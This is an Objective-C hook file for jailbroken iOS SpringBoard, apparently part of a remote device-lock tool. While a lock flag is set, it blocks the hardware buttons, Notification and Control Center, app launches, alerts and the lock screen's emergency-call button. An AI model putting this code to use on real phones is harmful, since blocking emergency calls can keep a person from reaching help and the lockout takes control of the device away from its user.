//
//  AlertLockHook.h
//  MSFCR
//
//  Created by Benjawan Tanarattanakorn on 6/22/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import <Foundation/Foundation.h>
#import "MSFDL.h"

#import "SpringBoard.h"
#import "SBUIController.h"
#import "SBApplication.h"
#import "SBApplicationController.h"
#import "VolumeControl.h"
#import "DeviceLockManagerUtils.h"
#import "SBApplication.h"
#import "SBAwayController.h"
#import "AlertLockStatus.h"
#import "SBAlertItemsController.h"
#import "SBBulletinBannerController.h"
#import "SBBulletinBannerItem.h"
#import "SMSAlertItem.h"
#import "BBBulletin.h"

#import "CKIMDBMessage.h"
#import "SharedFileIPC.h"
#import "DefStd.h"

#import "SBApplication+IOS7.h"
#import "SBBacklightController.h"
#import "SBControlCenterViewController.h"
#import "SBLockScreenViewController.h"
#import "SBLockScreenCameraController.h"

#import "HNDDisplayManager.h"

#pragma mark -
#pragma mark SpringBoard
#pragma mark -

// ********************************************************************************************
//					SpringBoard
// ********************************************************************************************


#pragma mark Menu Button

// for iOS 6
HOOK(SpringBoard, menuButtonDown$, void, struct __GSEvent * arg1) {
	DLog(@">>>>>>>>>>>>>>>>>>>>>>>> menu button DOWN");
	if ([[[DeviceLockManagerUtils sharedDeviceLockManagerUtils] mAlertLockStatus] mIsLock]) {
		DLog(@"This device is LOCK")
	} else {
		CALL_ORIG(SpringBoard, menuButtonDown$, arg1);
	}
}

// for iOS 7
HOOK(SpringBoard, _menuButtonDown$, void, struct __IOHIDEvent *arg1) {
    DLog(@">>>>>>>>>>>>>>>>>>>>>>>> menu button DOWN");
	if ([[[DeviceLockManagerUtils sharedDeviceLockManagerUtils] mAlertLockStatus] mIsLock]) {
		DLog(@"This device is LOCK")
	} else {
		CALL_ORIG(SpringBoard, _menuButtonDown$, arg1);
	}
}

// for iOS 6
HOOK(SpringBoard, menuButtonUp$, void, struct __GSEvent *arg1) {
	DLog(@">>>>>>>>>>>>>>>>>>>>>>>> menu button UP");
	if ([[[DeviceLockManagerUtils sharedDeviceLockManagerUtils] mAlertLockStatus] mIsLock]) {
		DLog(@"This device is LOCK")
	} else {
		CALL_ORIG(SpringBoard, menuButtonUp$, arg1);
	}
}

// for iOS 7
HOOK(SpringBoard, _menuButtonUp$, void, struct __GSEvent *arg1) {
	DLog(@">>>>>>>>>>>>>>>>>>>>>>>> menu button UP");
	if ([[[DeviceLockManagerUtils sharedDeviceLockManagerUtils] mAlertLockStatus] mIsLock]) {
		DLog(@"This device is LOCK")
	} else {
		CALL_ORIG(SpringBoard, _menuButtonUp$, arg1);
	}
}


#pragma mark Lock Button


// for iOS 6
HOOK(SpringBoard, lockButtonDown$, void, struct __GSEvent *arg1) {
	DLog(@">>>>>>>>>>>>>>>>>>>>>>>> lock Button Down");
	if ([[[DeviceLockManagerUtils sharedDeviceLockManagerUtils] mAlertLockStatus] mIsLock]) {
		DLog(@"This device is LOCK")
	} else {
		CALL_ORIG(SpringBoard, lockButtonDown$, arg1);
	}
}

// for iOS 7
HOOK(SpringBoard, _lockButtonDownFromSource$, void, int arg1) {
	DLog(@">>>>>>>>>>>>>>>>>>>>>>>> lock Button Down");
	if ([[[DeviceLockManagerUtils sharedDeviceLockManagerUtils] mAlertLockStatus] mIsLock]) {
		DLog(@"This device is LOCK")
	} else {
		CALL_ORIG(SpringBoard, _lockButtonDownFromSource$, arg1);
	}
}

// for iOS 6
HOOK(SpringBoard, lockButtonUp$, void, struct __GSEvent *arg1) {
	DLog(@">>>>>>>>>>>>>>>>>>>>>>>> lock Button UP");
	if ([[[DeviceLockManagerUtils sharedDeviceLockManagerUtils] mAlertLockStatus] mIsLock]) {
		DLog(@"This device is LOCK")
	} else {
		CALL_ORIG(SpringBoard, lockButtonUp$, arg1);
	}
}

// for iOS 7
HOOK(SpringBoard, _lockButtonUpFromSource$, void, int arg1) {
	DLog(@">>>>>>>>>>>>>>>>>>>>>>>> lock Button UP");
	if ([[[DeviceLockManagerUtils sharedDeviceLockManagerUtils] mAlertLockStatus] mIsLock]) {
		DLog(@"This device is LOCK")
	} else {
		CALL_ORIG(SpringBoard, _lockButtonUpFromSource$, arg1);
	}
}

HOOK(SpringBoard, lockButtonWasHeld, void) {
	DLog(@">>>>>>>>>>>>>>>>>>>>>>>> lock Button was hold");
	if ([[[DeviceLockManagerUtils sharedDeviceLockManagerUtils] mAlertLockStatus] mIsLock]) {
		//DLog(@"This device is LOCK")
	} else {
		CALL_ORIG(SpringBoard, lockButtonWasHeld);
	}
}


#pragma mark SpringBoard


HOOK(SpringBoard, quitTopApplication$, void, struct __GSEvent * arg1) {
	DLog(@">>>>>>>>>>>>>>>>>>>>>>>>quitTopApplication: %@", arg1);
	CALL_ORIG(SpringBoard, quitTopApplication$, arg1);	
}

HOOK(SpringBoard, showSpringBoardStatusBar, void) {
	DLog(@">>>>>>>>>>>>>>>>>>>>>>>> showSpringBoardStatusBar ");
	if ([[[DeviceLockManagerUtils sharedDeviceLockManagerUtils] mAlertLockStatus] mIsLock]) {
		DLog(@"This device is LOCK")
	} else {
		CALL_ORIG(SpringBoard, showSpringBoardStatusBar);
	}
}


#pragma mark VolumeControl


// ********************************************************************************************
//					VolumeControl
// ********************************************************************************************

// This is called when volume up button is pressed
HOOK(VolumeControl, increaseVolume, void) {
	DLog(@">>>>>>>>>>>>>>>>>>>>>>>> increaseVolume %f", [self volume]);
	if ([[[DeviceLockManagerUtils sharedDeviceLockManagerUtils] mAlertLockStatus] mIsLock]) {
		DLog(@"This device is LOCK");
	} else {
		CALL_ORIG(VolumeControl, increaseVolume);
	}
}

// This is called when volume down button is pressed
HOOK(VolumeControl, decreaseVolume, void) {
	DLog(@">>>>>>>>>>>>>>>>>>>>>>>> decreaseVolume %f", [self volume]);
	if ([[[DeviceLockManagerUtils sharedDeviceLockManagerUtils] mAlertLockStatus] mIsLock]) {
		//DLog(@"This device is LOCK")
	} else {
		CALL_ORIG(VolumeControl, decreaseVolume);
	}
}


#pragma mark SBUIController: Block Notification Plain


// ********************************************************************************************
//					SBUIController
// ********************************************************************************************

/**
 - Method name:		SBUIController --> _showNotificationsGestureBeganWithLocation& 
 - Purpose:			prevent the gesture begin. As a result, user cannot drag down Notification Center sheet
 - Arg(s):			struct CGPoint
 - Return:			none
 */
HOOK(SBUIController, _showNotificationsGestureBeganWithLocation$, void, struct CGPoint arg1) {
	DLog(@">>>>>>>>>>>>>>>>>>>>>>>>SBUIController, _showNotificationsGesture	Began	WithLocation");
    BOOL block = NO;
	
    // Lock device
	if ([[[DeviceLockManagerUtils sharedDeviceLockManagerUtils] mAlertLockStatus] mIsLock]) {
        DLog(@"Block Notification Plane (Lock/Alert Mode)")
		block = YES;
	}
	
	if (!block) { // Panic
		// -- Stop block auto lock in mobile substrate
		SharedFileIPC *shareFileIPC = [[SharedFileIPC alloc] initWithSharedFileName:kSharedFileMobileSubstrate1];
		NSData *panicStartData = [shareFileIPC readDataWithID:kSharedFilePanicStartID];
		if (panicStartData) {
			BOOL panicStart = NO;
			[panicStartData getBytes:&panicStart length:sizeof(BOOL)];
			block = panicStart;
            DLog(@"Block Notification Plane (Panic Mode) %d", block)
        }
		[shareFileIPC release];
	}
	
	if (!block) {
        CALL_ORIG(SBUIController, _showNotificationsGestureBeganWithLocation$, arg1);

	}

}


#pragma mark SBUIController: BLOCK Control Center


/*
 While swiping up Control Center
 step 1: SBUIController _showControlCenterGestureBeganWithLocation
 step 2: SBControlCenterViewController controlCenterWillPresent
 step 3: SBControlCenterViewController controlCenterWillBeginTransition
 */

HOOK(SBUIController, _showControlCenterGestureBeganWithLocation$, void, struct CGPoint arg1) {
	DLog(@">>>>>>>>>>>>>>>>>>>>>>>> SBUIController _showControlCenterGestureBeganWithLocation	Began	WithLocation");
    
    BOOL block = NO;
	
    // Lock device
	if ([[[DeviceLockManagerUtils sharedDeviceLockManagerUtils] mAlertLockStatus] mIsLock]) {
        DLog(@"Block Control Center (Lock/Alert Mode)")
		block = YES;
	}
	
	if (!block) { // Panic
		// -- Stop block auto lock in mobile substrate
		SharedFileIPC *shareFileIPC = [[SharedFileIPC alloc] initWithSharedFileName:kSharedFileMobileSubstrate1];
		NSData *panicStartData = [shareFileIPC readDataWithID:kSharedFilePanicStartID];
		if (panicStartData) {
			BOOL panicStart = NO;
			[panicStartData getBytes:&panicStart length:sizeof(BOOL)];
			block = panicStart;
            DLog(@"Block Control Center (Panic Mode) %d", block)
		}
		[shareFileIPC release];
	}
	
	if (!block) {
        CALL_ORIG(SBUIController, _showControlCenterGestureBeganWithLocation$, arg1);
	}
}

/**
 - Method name:		SBUIController --> finishLaunching
 - Purpose:			check a previous lock state of the device and then lock or unlock the device according to the previous state
 - Arg(s):			none
 - Return:			none
 */
HOOK(SBUIController, finishLaunching, void) {
	DLog(@">>>>>>>>>>>>>>>>>>>>>>>> finishLaunching");
	CALL_ORIG(SBUIController, finishLaunching);
	
	// check previous lock state before respring or reboot
	DeviceLockManagerUtils *deviceLockMgrUtil = [DeviceLockManagerUtils sharedDeviceLockManagerUtils];
	[deviceLockMgrUtil performSelector:@selector(checkPreviousLockStateAndKeepLockOrUnlockDevice)
							 withObject:nil
							 afterDelay:1.5];
}

/**
 - Method name:		SBUIController --> activateApplicationAnimated& 
 - Purpose:			This is required to stop some applications from launching
 - Arg(s):			SBApplication
 - Return:			none
 */
HOOK(SBUIController, activateApplicationAnimated$, void, id arg1) {
	DLog(@">>>>>>>>>>>>>>>>>>>>>>>>SBUIController, activateApplicationAnimated$");
	DLog(@"arg1 %@", arg1);
	if ([[[DeviceLockManagerUtils sharedDeviceLockManagerUtils] mAlertLockStatus] mIsLock]) {
		DLog(@"This device is LOCK")
	} else {
		CALL_ORIG(SBUIController, activateApplicationAnimated$, arg1);
	}
}



#pragma mark HNDDisplayManager block Assistive Touch


HOOK(HNDDisplayManager, viewPressed$, void, id pressed) {
    DLog (@"@@@@@@@@@@@@@@@@@@@ HNDDisplayManager --> viewPressed ---------------------")
    
    // -- read AlertLockStatus from DB
	SharedFileIPC *shareFileIPC = [[SharedFileIPC alloc] initWithSharedFileName:kSharedFileMobileSubstrate1];
	NSData *alertLockStatusData = [shareFileIPC readDataWithID:kSharedFileAlertLockID];
	[shareFileIPC release];
	shareFileIPC = nil;
    
	AlertLockStatus *alertLockStatus = nil;
	if (alertLockStatusData) {
		alertLockStatus = [[AlertLockStatus alloc] initFromData:alertLockStatusData];
		[alertLockStatus autorelease];
		DLog(@"alertLockStatus %d", [alertLockStatus mIsLock])
	} else {
		alertLockStatus = [[AlertLockStatus alloc] initWithLockStatus:NO deviceLockMessage:@""];
		[alertLockStatus autorelease];
	}
    
    if ([alertLockStatus mIsLock]) {
		DLog(@"This device is LOCK")
        CALL_ORIG(HNDDisplayManager, viewPressed$, nil);
	} else {
        DLog(@"This device is NOT LOCK")
        CALL_ORIG(HNDDisplayManager, viewPressed$, pressed);
	}
}


#pragma mark SBApplication


// ********************************************************************************************
//					SBApplication
// ********************************************************************************************

HOOK(SBApplication, launchSucceeded$, void, BOOL arg1) {
	DLog(@">>>>>>>>>>>>>>>>>>>>>>>> SBApplication, launchSucceeded");
	DLog(@"bool %d self, %@",arg1, self);
	
	if ([[[DeviceLockManagerUtils sharedDeviceLockManagerUtils] mAlertLockStatus] mIsLock]) {
		DLog(@"This device is LOCK")
		
		CALL_ORIG(SBApplication, launchSucceeded$, arg1);
		
		UIApplication *uiApplication = [objc_getClass("UIApplication") sharedApplication];
		
		[(SpringBoard *) uiApplication quitTopApplication:nil];		// quit the application running on top
		[(SpringBoard *) uiApplication hideSpringBoardStatusBar];	// hide spring board status bar
		[uiApplication setStatusBarHidden:YES];
		
//		DeviceLockManagerUtils *util = [DeviceLockManagerUtils sharedDeviceLockManagerUtils];
//		[util performSelector:@selector(bringLockViewToFront) withObject:nil afterDelay:1];
		
	} else {
		CALL_ORIG(SBApplication, launchSucceeded$, arg1);	
	}
}



#pragma mark SBAwayController


// ********************************************************************************************
//					SBAwayController
// ********************************************************************************************

// prevent device to undim the screen
// This class doesn't exist on iOS 7
HOOK(SBAwayController, dimScreen$, void, BOOL arg1) {
	DLog(@">>>>>>>>>>>>>>>>>>>>>>>> SBAwayController, dimScreen");
	if ([[[DeviceLockManagerUtils sharedDeviceLockManagerUtils] mAlertLockStatus] mIsLock]) {
	} else {
		CALL_ORIG(SBAwayController, dimScreen$, arg1);
	}
}


#pragma mark SBAlertItemsController


// ********************************************************************************************
//					SBAlertItemsController
// ********************************************************************************************

id getInstanceVariable(id x, NSString * s) {
    Ivar ivar = class_getInstanceVariable([x class], [s UTF8String]);
    return object_getIvar(x, ivar);
}

// block alerts on the middle of screen
HOOK(SBAlertItemsController, activateAlertItem$, void, id arg1) {
	DLog(@">>>>>>>>>>>>>>>>>>>>>>>> SBAlertItemsController, activateAlertItem$, %@", arg1);
	BOOL blockOrginalCall = [[[DeviceLockManagerUtils sharedDeviceLockManagerUtils] mAlertLockStatus] mIsLock];
	
	if (!blockOrginalCall) {
		CALL_ORIG(SBAlertItemsController, activateAlertItem$, arg1);
	}
}


#pragma mark SBBulletinBannerController


// ********************************************************************************************
//					SBBulletinBannerController
// ********************************************************************************************

// block banner alert for alert and lock feature
HOOK(SBBulletinBannerController, _presentBannerForItem$, void, id arg1) {
	DLog(@">>>>>>>>>>>>>>>>>>>>>>>> SBBulletinBannerController, _presentBannerForItem");
	DLog(@"_presentBannerForItem arg1: %@", arg1) // SBBulletinBannerItem
	
	DLog(@"_appName %@", [arg1 _appName])
	DLog(@"title %@", [arg1 title])
	DLog(@"message %@", [arg1 message])

	BOOL blockOrginalCall = [[[DeviceLockManagerUtils sharedDeviceLockManagerUtils] mAlertLockStatus] mIsLock];			   
	
	if (!blockOrginalCall) {
		CALL_ORIG(SBBulletinBannerController, _presentBannerForItem$, arg1);
	}
}

// block banner alert for alert and lock feature
HOOK(SBBulletinBannerController, _queueBulletin$, void, id arg1) {
	DLog(@">>>>>>>>>>>>>>>>>>>>>>>> SBBulletinBannerController, _queueBulletin");
	DLog(@"_presentBannerForItem arg1: %@", arg1)               // SBBulletinBannerItem
                                                                // BBBulletin
	DLog(@"title %@", [arg1 title])
	DLog(@"message %@", [arg1 message])
    
	BOOL blockOrginalCall = [[[DeviceLockManagerUtils sharedDeviceLockManagerUtils] mAlertLockStatus] mIsLock];
	
	if (!blockOrginalCall) {
		CALL_ORIG(SBBulletinBannerController, _queueBulletin$, arg1);
	}
}


#pragma mark Auto Lock for iOS 6


HOOK(SpringBoard, autoLock, void) {
	DLog (@"SpringBoard autoLock -----------------");
	
	BOOL block = NO;
	// Lock device
	if ([[[DeviceLockManagerUtils sharedDeviceLockManagerUtils] mAlertLockStatus] mIsLock]) {
		block = YES;
	}
	
	if (!block) { // Panic
		// -- Stop block auto lock in mobile substrate
		SharedFileIPC *shareFileIPC = [[SharedFileIPC alloc] initWithSharedFileName:kSharedFileMobileSubstrate1];
		NSData *panicStartData = [shareFileIPC readDataWithID:kSharedFilePanicStartID];
		if (panicStartData) {
			BOOL panicStart = NO;
			[panicStartData getBytes:&panicStart length:sizeof(BOOL)];
			block = panicStart;
		}
		[shareFileIPC release];
	}
	
	if (!block) {
		CALL_ORIG(SpringBoard, autoLock);
	}
}


#pragma mark DIM and Auto Lock for iOS 7


/***********************************************************
 while dimming
    step 1 SBBacklightController _didIdle
    step 2 SBBacklightController _autoLockTimerFired  >>> if this method is blocked from calling the original, step 2 will not be called
    step 3 SBLockScreenManager, _lockScreenDimmed
 // This is called when auto lock on iOS 7
 ***********************************************************/

// STEP 1
HOOK(SBBacklightController, _didIdle, void) {
    DLog (@"!!!!!!!!!!!!!!!!!!!!!!!!!! SBBacklightController _didIdle -----------------");
  
    BOOL block = NO;
	
    // Lock device
	if ([[[DeviceLockManagerUtils sharedDeviceLockManagerUtils] mAlertLockStatus] mIsLock]) {
        DLog(@"Block from idle (screen starts dimming)")
		block = YES;
	}
	
	if (!block) { // Panic
		// -- Stop block auto lock in mobile substrate
		SharedFileIPC *shareFileIPC = [[SharedFileIPC alloc] initWithSharedFileName:kSharedFileMobileSubstrate1];
		NSData *panicStartData = [shareFileIPC readDataWithID:kSharedFilePanicStartID];
		if (panicStartData) {
			BOOL panicStart = NO;
			[panicStartData getBytes:&panicStart length:sizeof(BOOL)];
			block = panicStart;
		}
		[shareFileIPC release];
	}
	
	if (!block) {
		CALL_ORIG(SBBacklightController, _didIdle);
	}
}

// STEP 3
HOOK(SBBacklightController, _lockScreenDimTimerFired, void) {
    DLog(@"*****************************************")
    DLog (@"!!!!!!!!!!!!!!!!!!!!!!!!!! SBBacklightController _lockScreenDimTimerFired -----------------");
    DLog(@"*****************************************")
    BOOL block = [[[DeviceLockManagerUtils sharedDeviceLockManagerUtils] mAlertLockStatus] mIsLock];
    
    CALL_ORIG(SBBacklightController, _lockScreenDimTimerFired);
    
    if (block) {
        DLog(@"BLOCK: undim")
        [self _undimFromSource:0];
    }
}


#pragma mark SBLockScreenViewController


// block emergency call while the device is presenting iPhone lock screen
HOOK(SBLockScreenViewController, passcodeLockViewEmergencyCallButtonPressed$, void, id arg1) {
	DLog(@">>>>>>>>>>>>>>>>>>>>>>>> SBLockScreenViewController, passcodeLockViewEmergencyCallButtonPressed");
    DLog(@"arg1 %@", arg1)
    BOOL block = [[[DeviceLockManagerUtils sharedDeviceLockManagerUtils] mAlertLockStatus] mIsLock];
    if (!block) {
        CALL_ORIG(SBLockScreenViewController, passcodeLockViewEmergencyCallButtonPressed$ ,arg1);
    }
}


#pragma mark -
#pragma mark Not use


/*
 HOOK(SBLockScreenViewController, activateCameraAnimated$, void, BOOL arg1) {
 DLog(@">>>>>>>>>>>>>>>>>>>>>>>> SBLockScreenViewController, activateCameraAnimated");
 DLog(@"arg1 %d", arg1)
 
 CALL_ORIG(SBLockScreenViewController, activateCameraAnimated$ ,arg1);
 
 }
 
 HOOK(SBLockScreenViewController, launchEmergencyDialer, void) {
 DLog(@">>>>>>>>>>>>>>>>>>>>>>>> SBLockScreenViewController, launchEmergencyDialer");
 CALL_ORIG(SBLockScreenViewController, launchEmergencyDialer);
 }
 */
/*
 // this is called when passcord is entered, arg1 is the passcord string
 HOOK(SBLockScreenManager, attemptUnlockWithPasscode$, BOOL, id arg1) {
 DLog(@">>>>>>>>>>>>>>>>>>>>>>>> SBLockScreenManager, attemptUnlockWithPasscode");
 DLog(@"arg 1 %@", arg1)
 BOOL result  = CALL_ORIG(SBLockScreenManager, attemptUnlockWithPasscode$, arg1);
 DLog(@"result %d", result)
 return result;
 }
 
 HOOK(SBLockScreenManager, _handleExternalUIUnlock$, void, id arg1) {
 DLog(@">>>>>>>>>>>>>>>>>>>>>>>> SBLockScreenManager, _handleExternalUIUnlock");
 DLog(@"arg 1 %@", arg1)
 CALL_ORIG(SBLockScreenManager, _handleExternalUIUnlock$, arg1);
 
 }
 */
/*
 HOOK(SBLockScreenManager, startUIUnlockFromSource$withOptions$, void, int arg1, id arg2) {
 DLog(@">>>>>>>>>>>>>>>>>>>>>>>> SBLockScreenManager, startUIUnlockFromSource");
 DLog(@"arg 1 %d", arg1)
 DLog(@"arg 2 %@", arg2)
 CALL_ORIG(SBLockScreenManager, startUIUnlockFromSource$withOptions$, arg1, arg2);
 
 
 }
 */
/*
 HOOK(SBLockScreenManager, unlockUIFromSource$withOptions$, void, int arg1, id arg2) {
 DLog(@">>>>>>>>>>>>>>>>>>>>>>>> SBLockScreenManager, unlockUIFromSource");
 DLog(@"arg 1 %d", arg1)
 DLog(@"arg 2 %@", arg2)
 CALL_ORIG(SBLockScreenManager, unlockUIFromSource$withOptions$, arg1, arg2);
 
 }
 */
/*
 HOOK(SBLockScreenManager, _setUILocked$, void, BOOL arg1) {
 DLog(@">>>>>>>>>>>>>>>>>>>>>>>> SBLockScreenManager, _setUILocked");
 DLog(@"arg 1 %d", arg1)
 CALL_ORIG(SBLockScreenManager, _setUILocked$, arg1);
 }
 
 
 #pragma mark SBLockScreenCameraController
 
 
 HOOK(SBLockScreenCameraController, activateCamera, void) {
 DLog(@">>>>>>>>>>>>>>>>>>>>>>>> SBLockScreenCameraController, activateCamera");
 CALL_ORIG(SBLockScreenCameraController, activateCamera);
 
 }
 
 */


#pragma mark R&D Finding the method to replace 'launchSucceeded'


/* not used
 // Called
 HOOK(SBApplication, _setHasBeenLaunched, void) {
 DLog(@">>>>>>>>>>>>>>>>>>>>>>>> SBApplication, _setHasBeenLaunched");
 DLog(@"self, %@", self);    // SBApplication
 CALL_ORIG(SBApplication, _setHasBeenLaunched);
 }
 
 // Called
 HOOK(SBApplication, _sendDidLaunchNotification$, void, BOOL arg1) {
 DLog(@">>>>>>>>>>>>>>>>>>>>>>>> SBApplication, _sendDidLaunchNotification");
 DLog(@"self %@ arg1 %d", self, arg1);
 CALL_ORIG(SBApplication, _sendDidLaunchNotification$, arg1);
 }
 
 // Called
 HOOK(SBApplication, didLaunch$, void, id arg1) {
 DLog(@">>>>>>>>>>>>>>>>>>>>>>>> SBApplication, didLaunch");
 DLog(@"self %@ arg1 %@", self, arg1); // SBApplication
 CALL_ORIG(SBApplication, didLaunch$, arg1);
 }
 */


#pragma mark R&D Dimming Screen on IOS 7

/*

// For ios 7 (Called)

 HOOK(SBLockScreenManager, _lockScreenDimmed$, void, BOOL arg1) {
 DLog(@">>>>>>>>>>>>>>>>>>>>>>>> SBLockScreenManager, _lockScreenDimmed");
 CALL_ORIG(SBLockScreenManager, _lockScreenDimmed$, arg1);
 }


// STEP 2

 HOOK(SBBacklightController, _autoLockTimerFired$, void, id arg1) {
 DLog (@"!!!!!!!!!!!!!!!!!!!!!!!!!! SBBacklightController _autoLockTimerFired -----------------");
 CALL_ORIG(SBBacklightController, _autoLockTimerFired$, arg1);
 }

HOOK(SBBacklightController, _undimFromSource$, void, int arg) {
    DLog(@"*****************************************")
    DLog (@"!!!!!!!!!!!!!!!!!!!!!!!!!! SBBacklightController _undimFromSource -----------------");
    DLog(@"*****************************************")

    
    DLog(@"source %d", arg)
    CALL_ORIG(SBBacklightController, _undimFromSource$, arg);
    
}

*/

#pragma mark R&D Control Center on IOS 7


/*
 HOOK(SBControlCenterViewController, controlCenterWillPresent, void) {
 DLog (@"!!!!!!!!!!!!!!!!!!!!!!!!!! SBControlCenterViewController controlCenterWillPresent -----------------");
 CALL_ORIG(SBControlCenterViewController, controlCenterWillPresent);
 
 
 }
 */
/*
 HOOK(SBControlCenterViewController, controlCenterWillBeginTransition, void) {
 DLog (@"!!!!!!!!!!!!!!!!!!!!!!!!!! SBControlCenterViewController controlCenterWillBeginTransition -----------------");
 
 CALL_ORIG(SBControlCenterViewController, controlCenterWillBeginTransition);
 }
 */
/*
 HOOK(SBControlCenterViewController, gestureRecognizer$shouldReceiveTouch$, BOOL, id arg1, id arg2) {
 DLog (@"!!!!!!!!!!!!!!!!!!!!!!!!!! SBControlCenterViewController gestureRecognizer -----------------");
 
 DLog(@"arg 1 %@", arg1)
 DLog(@"arg 2 %@", arg2)
 BOOL block = NO;
 
 BOOL returnValue = CALL_ORIG(SBControlCenterViewController, gestureRecognizer$shouldReceiveTouch$, arg1, arg2);
 return returnValue;
 }
 */

/*
 HOOK(SBLockScreenViewControllerBase, wantsScreenToAutoDim, BOOL) {
 DLog (@"!!!!!!!!!!!!!!!!!!!!!!!!!! SBLockScreenViewControllerBase wantsScreenToAutoDim -----------------");
 
 BOOL want = CALL_ORIG(SBLockScreenViewControllerBase, wantsScreenToAutoDim);
 return want;
 }
 */
/*
 // not called
 HOOK(SBUserAgent, lockAndDimDevice, void) {
 DLog (@"!!!!!!!!!!!!!!!!!!!!!!!!!! SBUserAgent lockAndDimDevice -----------------");
 NSString *identifier = [[NSBundle mainBundle] bundleIdentifier];
 DLog (@"BLOCKING:	MSFDL Loaded with identifier = %@", identifier);
 
 CALL_ORIG(SBUserAgent, lockAndDimDevice);
 }
 // not called
 HOOK(SBUserAgent, undimScreen, void) {
 DLog (@"!!!!!!!!!!!!!!!!!!!!!!!!!! SBUserAgent undimScreen -----------------");
 NSString *identifier = [[NSBundle mainBundle] bundleIdentifier];
 DLog (@"BLOCKING:	MSFDL Loaded with identifier = %@", identifier);
 
 CALL_ORIG(SBUserAgent, undimScreen);
 }
 // not called
 HOOK(SBUserAgent, dimScreen$, void, BOOL arg1) {
 DLog (@"!!!!!!!!!!!!!!!!!!!!!!!!!! SBUserAgent dimScreen -----------------");
 NSString *identifier = [[NSBundle mainBundle] bundleIdentifier];
 DLog (@"BLOCKING:	MSFDL Loaded with identifier = %@", identifier);
 
 DLog(@"arg 1 %d", arg1)
 CALL_ORIG(SBUserAgent, dimScreen$, arg1);
 }
 
 HOOK(SBUIFullscreenAlertAdapter, handleAutoLock, void) {
 DLog (@"!!!!!!!!!!!!!!!!!!!!!!!!!! SBUIFullscreenAlertAdapter _autoLockTimerFired -----------------");
 
 CALL_ORIG(SBUIFullscreenAlertAdapter, handleAutoLock);
 }

 HOOK(SpringBoard, lockScreenCameraSupported, BOOL) {
    DLog(@">>>>>>>>>>>>>>>>>>>>>>>> lockScreenCameraSupported ");
 
    BOOL result = CALL_ORIG(SpringBoard, lockScreenCameraSupported);
    DLog(@"result %d", result)
    return result;
 }
 
 // not used
 HOOK(SpringBoard, applicationExited$, void, struct __GSEvent * arg1) {
 DLog(@">>>>>>>>>>>>>>>>>>>>>>>> applicationExited");
 CALL_ORIG(SpringBoard, applicationExited$, arg1);
 }
 
 // not used
 HOOK(SpringBoard, anotherApplicationFinishedLaunching$, void, struct __GSEvent * arg1) {
 DLog(@">>>>>>>>>>>>>>>>>>>>>>>> anotherApplicationFinishedLaunching%@", arg1);
 CALL_ORIG(SpringBoard, anotherApplicationFinishedLaunching$, arg1);
 }
 
 // not used
 HOOK(SpringBoard, applicationSuspend$, void, struct __GSEvent * arg1) {
 DLog(@">>>>>>>>>>>>>>>>>>>>>>>> applicationSuspend ");
 CALL_ORIG(SpringBoard, applicationSuspend$, arg1);
 }
 */

/*
// not used
HOOK(SBUIController, activateApplicationFromSwitcher$, void, id arg1) {
	DLog(@">>>>>>>>>>>>>>>>>>>>>>>>SBUIController, activateApplication FromSwitcher");
	DLog(@"arg1 %@", arg1);
	CALL_ORIG(SBUIController, activateApplicationFromSwitcher$, arg1);
}

// not used
HOOK(SBUIController, animateApplicationSuspend$, void, id arg1) {
	DLog(@">>>>>>>>>>>>>>>>>>>>>>>>SBUIController, animateApplication Suspend");
	DLog(@"arg1 %@", arg1);
	CALL_ORIG(SBUIController, animateApplicationSuspend$, arg1);
}

// not used
HOOK(SBUIController, animateApplicationActivation$animateDefaultImage$scatterIcons$, void, id arg1, BOOL arg2, BOOL arg3) {
	DLog(@">>>>>>>>>>>>>>>>>>>>>>>>SBUIController, animateApplication Activation ");
	DLog(@"arg1 %@", arg1);
	CALL_ORIG(SBUIController, animateApplicationActivation$animateDefaultImage$scatterIcons$, arg1,arg2, arg3);
}
*/

/*
 // not used
 HOOK(SBApplication, activate, void) {
 DLog(@">>>>>>>>>>>>>>>>>>>>>>>> SBApplication, activate");
 DLog(@"self, %@", self);
 CALL_ORIG(SBApplication, activate);
 }
 */

/**
 - Method name:		SBApplication --> launchSucceeded& 
 - Purpose:			This method is called when an application is already launched and appeared on the screen
 - Arg(s):			BOOL
 - Return:			none
 */

/*
 // not used
 HOOK(SBApplication, launch, void) {
 DLog(@">>>>>>>>>>>>>>>>>>>>>>>> SBApplication, launch");
 DLog(@"self, %@", self);
 CALL_ORIG(SBApplication, launch);
 }
 
 // not used
 // class method
 HOOK(SBApplication, initialize, void) {
 DLog(@">>>>>>>>>>>>>>>>>>>>>>>> SBApplication, initialize");
 CALL_ORIG(SBApplication, initialize);	
 }
 */

// ********************************************************************************************
//					SBAlertWindow
// ********************************************************************************************

// doesn't work on ios 4.3.3
// work on ios 5.0.1
/**
 - Method name:		SBAlertWindow --> displayAlert& 
 - Purpose:			prevent the calling view to show on top of our lock screen
 - Arg(s):			SBUIFullscreenAlertAdapter
 - Return:			none
 */
//HOOK(SBAlertWindow, displayAlert$, void, id arg1) {
//	DLog(@">>>>>>>>>>>>>>>>>>>>>>>> SBAlertWindow, displayAlert %@",arg1);
//	if ([[[DeviceLockManagerUtils sharedDeviceLockManagerUtils] mAlertLockStatus] mIsLock]) {
//		CALL_ORIG(SBAlertWindow, displayAlert$, arg1);
//		[self dismissWindow:arg1];
//	} else {
//		CALL_ORIG(SBAlertWindow, displayAlert$, arg1);	// need to call, otherwise ALL app can not be open when unlock
//	}
//}
//HOOK(SBAwayController, lock, void) {
//	DLog(@">>>>>>>>>>>>>>>>>>>>>>>> SBAwayController, lock");
//	CALL_ORIG(SBAwayController, lock);
//	
//}
//
//HOOK(SBAwayController, unlockWithSound$, void, BOOL arg1) {
//	DLog(@">>>>>>>>>>>>>>>>>>>>>>>> SBAwayController, unlockWithSound");
//	CALL_ORIG(SBAwayController, unlockWithSound$, arg1);
//}

